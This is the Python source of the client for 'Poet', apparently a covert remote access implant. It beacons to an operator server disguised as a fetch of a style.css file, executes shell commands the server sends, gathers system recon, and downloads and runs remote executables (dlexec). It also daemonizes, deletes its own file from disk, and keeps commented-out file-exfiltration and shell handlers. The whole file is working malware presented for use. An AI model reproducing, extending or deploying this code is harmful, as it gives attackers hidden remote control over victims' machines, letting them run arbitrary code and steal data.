#!/usr/bin/python2.7

import os
import re
import sys
import stat
import time
import zlib
import base64
import select
import socket
import os.path
import urllib2
import argparse
import tempfile
import subprocess as sp

import debug
import module
import config as CFG
from poetsocket import *

UA = 'Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11'

if __file__.endswith('.py'):
    CLIENT_PATH = os.path.abspath(__file__)
else:
    CLIENT_PATH = os.path.dirname(os.path.abspath(__file__))


class PoetSocketClient(PoetSocket):
    def __init__(self, host, port):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((host, port))
        super(PoetSocketClient, self).__init__(self.s)


class PoetClient(object):
    """Core client functionality.

    Receives commands from server, does bidding, responds.

    Note: In any function with `inp' as a parameter, `inp' refers to the
    command string sent from the server.

    Attributes:
        host: server ip address
        port: server port
    """

    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.s = None

    def start(self):
        """Core Poet client functionality."""

        self.s = PoetSocketClient(self.host, self.port)
        while True:
            try:
                found = False
                inp = self.s.recv()

                if inp == 'fin':
                    found = True
                    break
                elif inp == 'selfdestruct':
                    try:
                        selfdestruct()
                        self.s.send('boom')
                        sys.exit()
                    except Exception as e:
                        self.s.send(str(e.message))
                elif inp.startswith('chint'):
                    found = True
                    self.chint(self.s, inp)

                # elif re.search('^exec ("[^"]+"\ )+$', inp + ' '):
                #     s.send(self.execute(inp))
                # elif inp == 'recon':
                #     s.send(zlib.compress(self.recon()))
                # elif inp.startswith('shell '):
                #     self.shell(inp, s)
                #     s.send('shelldone')
                # elif inp.startswith('exfil '):
                #     try:
                #         with open(os.path.expanduser(inp[6:])) as f:
                #             s.send(zlib.compress(f.read()))
                #     except IOError as e:
                #         s.send(e.strerror)
                # elif inp == 'selfdestruct':
                #     try:
                #         selfdestruct()
                #         s.send('boom')
                #         sys.exit()
                #     except Exception as e:
                #         s.send(str(e.message))
                # elif inp.startswith('dlexec '):
                #     try:
                #         self.dlexec(inp)
                #         s.send('done')
                #     except Exception as e:
                #         s.send(str(e.message))
                # elif inp.startswith('chint'):
                #     self.chint(s, inp)

                for cmd, func in module.client_commands.iteritems():
                    if inp.split()[0] == cmd:
                        found = True
                        try:
                            func(self, inp)
                        except Exception as e:
                            self.s.send(str(e.args))

                if not found:
                    self.s.send('Unrecognized')
            except socket.error as e:
                if e.message == 'too much data!':
                    self.s.send('posh : ' + e.message)
                else:
                    raise
        self.s.close()

    def execute(self, inp):
        """Handle server `exec' command.

        Execute specially formatted input string and return specially formatted
        response.
        """

        out = ''
        cmds = self.parse_exec_cmds(inp[5:])
        for cmd in cmds:
            cmd_out = self.cmd_exec(cmd)
            out += '='*20 + '\n\n$ {}\n{}\n'.format(cmd, cmd_out)
        return out

    def recon(self):
        """Executes recon commands."""

        ipcmd = 'ip addr' if 'no' in self.cmd_exec('which ifconfig') else 'ifconfig'
        exec_str = 'exec "whoami" "id" "uname -a" "lsb_release -a" "{}" "w" "who -a"'.format(ipcmd)
        return self.execute(exec_str)

    def dlexec(self, inp):
        """Handle server `dlexec' command.

        Download file from internet, save to temp file, execute.
        """

        r = urllib2.urlopen(inp.split()[1])
        with tempfile.NamedTemporaryFile(delete=False) as f:
            f.write(r.read())
            f.flush()
            os.fchmod(f.fileno(), stat.S_IRWXU)

        # intentionally not using sp.call() here because we don't
        # necessarily want to wait() on the process. also, this is outside
        # the with block to avoid a `Text file busy' error (linux)
        sp.Popen(f.name, stdout=open(os.devnull, 'w'), stderr=sp.STDOUT)

        # we need this sleep(1) because of a race condition between the
        # Popen and following remove. If there were no sleep, in the Popen,
        # between the time it takes for the parent to fork, and the child's
        # exec syscall to load the file into memory, the parent would return
        # back here and delete the file before it gets executed. by sleeping
        # 1 second, we give the child a reasonable amount of time to hit the
        # exec syscall.
        #
        # NOTE: this is not a 100% solution. if for some reason, the time
        # between the child fork/exec is longer than 1 second (lol) the file
        # will still be deleted before it's executed. a "safer" solution would
        # be to keep track of all the paths of files downloaded and add a
        # shell "cleanup" command which could be run regularly to remove all
        # those paths after you know they're executed
        time.sleep(1)

        os.remove(f.name)

    def chint(self, s, inp):
        """Handle server `chint' command.

        Send back the current delay interval or set it to new value.
        """

        if inp == 'chint':
            # no arg, so just send back the interval
            s.send(str(args.interval))
        else:
            # set interval to arg
            try:
                num = int(inp.split()[1])
                if num < 1:
                    msg = 'Invalid interval time.'
                else:
                    args.interval = num
                    msg = 'done'
                s.send(msg)
            except Exception as e:
                s.send(str(e.message))

    def cmd_exec(self, cmd):
        """Light wrapper over subprocess.Popen()."""

        return sp.Popen(cmd, stdout=sp.PIPE, stderr=sp.STDOUT,
                        shell=True).communicate()[0]

    def parse_exec_cmds(self, inp):
        """Parse string provided by server `exec' command.

        Convert space delimited string with commands to execute in quotes, for
        example ("ls -l" "cat /etc/passwd") into list with commands as strings.

        Returns:
            List of commands to execute.
        """

        if inp.count('"') == 2:
            return [inp[1:-1]]
        else:
            # server side regex guarantees that these quotes will be in the
            # correct place -- the space between two commands
            third_quote = inp.find('" "') + 2
            first_cmd = inp[:third_quote-1]
            rest = inp[third_quote:]
            return [first_cmd[1:-1]] + self.parse_exec_cmds(rest)


def get_args():
    """ Parse arguments and return dictionary. """

    parser = argparse.ArgumentParser()
    parser.add_argument('host', metavar='IP', type=str, help='Poet Server')
    parser.add_argument('interval', metavar='INTERVAL', type=int,
                        help='Beacon Interval, in seconds. Default: 600',
                        nargs='?', default=600)
    parser.add_argument('-p', '--port')
    parser.add_argument('--debug', action="store_true",
                        help="show debug messages. implies --no-daemon")
    parser.add_argument('--no-daemon', action='store_true',
                        help="don't daemonize")
    parser.add_argument('--no-selfdestruct', action='store_true',
                        help="don't selfdestruct")
    return parser.parse_args()


def is_active(host, port):
    """Check if server is active.

    Send HTTP GET for a fake /style.css which server will respond to if it's
    alive.

    Args:
        host: server ip address
        port: server port

    Returns:
        Boolean for server state.
    """

    try:
        url = 'http://{}:{}/style.css'.format(host, port)
        headers = {
            'User-Agent': UA,
            'Cookie': 'c={};'.format(base64.b64encode(CFG.AUTH))
        }
        req = urllib2.Request(url, headers=headers)
        f = urllib2.urlopen(req)
        if f.code == 200:
            return True
    except urllib2.URLError:
        pass
    return False


def selfdestruct():
    """Delete client executable from disk.
    """

    if os.path.exists(CLIENT_PATH):
        os.remove(CLIENT_PATH)


def daemonize():
    """Daemonize client.
    http://www.jejik.com/articles/2007/02/a_simple_unix_linux_daemon_in_python/
    """

    # already a daemon?
    if os.getppid() == 1:
        return

    # break out of shell
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError:
        # silently faily
        sys.exit(1)

    # standard decoupling
    os.setsid()     # detach from terminal
    os.umask(0022)  # not really necessary, client isn't creating files
    os.chdir('/')   # so we don't block a fs from unmounting

    # denature std fd's
    si = file('/dev/null', 'r')
    so = file('/dev/null', 'a+')
    se = file('/dev/null', 'a+', 0)
    os.dup2(si.fileno(), sys.stdin.fileno())
    os.dup2(so.fileno(), sys.stdout.fileno())
    os.dup2(se.fileno(), sys.stderr.fileno())


def main():
    global args
    args = get_args()

    # dynamically load all modules. needs to be before daemonize because it
    # needs to be able to open itself to find modindex.txt in package.c
    # daemonize changes the cwd so the open won't work.
    module.load_modules()

    # daemonize if we're not in --no-daemon or --debug mode
    if not args.no_daemon and not args.debug:
        daemonize()

    # disable debug messages if we're not in --debug
    if not args.debug:
        debug.disable()

    if not args.no_selfdestruct:
        debug.info('Deleting client')
        try:
            selfdestruct()
        except Exception as e:
            # fatal
            sys.exit(0)

    HOST = args.host
    PORT = int(args.port) if args.port else 443

    debug.info(('Poet started with interval of {} seconds to port {}. Ctrl-c to exit').format(args.interval, PORT))

    try:
        while True:
            if is_active(HOST, PORT):
                debug.info('Server is active')
                PoetClient(HOST, PORT).start()
            else:
                debug.warn('Server is inactive')
            time.sleep(args.interval)
    except KeyboardInterrupt:
        print
        debug.err('Poet terminated')
    except Exception as e:
        debug.warn('Fatal error: {}'.format(e.message))
        debug.err('Poet terminated')
        sys.exit(0)

if __name__ == '__main__':
    main()
